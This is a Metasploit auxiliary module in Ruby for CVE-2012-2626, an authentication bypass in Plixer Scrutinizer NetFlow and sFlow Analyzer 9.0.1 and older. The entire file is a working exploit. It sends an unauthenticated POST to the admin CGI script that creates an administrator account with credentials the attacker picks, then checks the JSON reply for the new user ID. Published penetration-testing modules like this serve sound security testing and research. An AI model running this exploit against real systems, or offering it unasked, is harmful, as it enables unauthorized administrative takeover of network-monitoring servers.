##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
# Framework web site for more information on licensing and terms of use.
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Plixer Scrutinizer NetFlow and sFlow Analyzer HTTP Authentication Bypass',
      'Description'    => %q{
        This will add an administrative account to Scrutinizer NetFlow and sFlow Analyzer
        without any authentication.  Versions such as 9.0.1 or older are affected.
      },
      'References'     =>
        [
          [ 'CVE', '2012-2626' ],
          [ 'OSVDB', '84318' ],
          [ 'URL', 'https://www.trustwave.com/spiderlabs/advisories/TWSL2012-014.txt' ]
        ],
      'Author'         =>
        [
          'MC',
          'Jonathan Claudius',
          'Tanya Secker',
          'sinn3r'
        ],
      'License'        => MSF_LICENSE,
      'DisclosureDate' => "Jul 27 2012"
    ))

    register_options(
      [
        OptString.new("TARGETURI", [true, 'The path to the admin CGI script', '/cgi-bin/admin.cgi']),
        OptString.new("USERNAME", [true, 'The username for your new account']),
        OptString.new("PASSWORD", [true, 'The password for your new account'])
      ], self.class)
  end

  def run
    uri = normalize_uri(target_uri.path)
    res = send_request_cgi({
      'method'    => 'POST',
      'uri'       => uri,
      'vars_post' => {
        'tool'              => 'userprefs',
        'newUser'           => datastore['USERNAME'],
        'pwd'               => datastore['PASSWORD'],
        'selectedUserGroup' => '1'
      }
    })

    if not res
      print_error("No response from server")
      return
    end

    begin
      require 'json'
    rescue LoadError
      print_error("Json is not available on your machine")
      return
    end

    begin
      j = JSON.parse(res.body)

      if j['error']
        print_error(j['error'])
      elsif j['new_user_id']
        print_good("User created. ID = #{j['new_user_id']}")
      else
        print_status("Unexpected response:")
        print_status(j.to_s)
      end

    rescue JSON::ParserError
      print_error("Unable to parse JSON")
      print_line(res.body)
    end
  end

end
